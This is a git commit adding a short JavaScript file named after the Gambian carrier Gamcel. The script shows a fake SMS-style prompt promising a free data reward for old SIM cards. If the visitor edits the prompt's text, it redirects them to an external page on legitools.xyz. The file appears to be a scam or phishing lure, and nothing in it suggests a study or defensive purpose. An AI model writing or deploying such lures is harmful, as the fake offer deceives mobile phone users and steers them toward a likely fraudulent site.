e235f91e486f32751411f2219d99e7db8331350c
harryjohnson86 <mfonjohnson86@gmail.com>
2025-02-06 17:01:16 -0800

    Create gamcel.com.js

---
+++ gamcel.com.js
@@ -0,0 +1,5 @@
+var password = 'Free Data Reward'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive Free Data OLD GAMCEL SIM CARD REWARD, Kindly Press OK to ACTIVATE. ','Free Data Reward');
+if (password != 'Free Data Reward') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
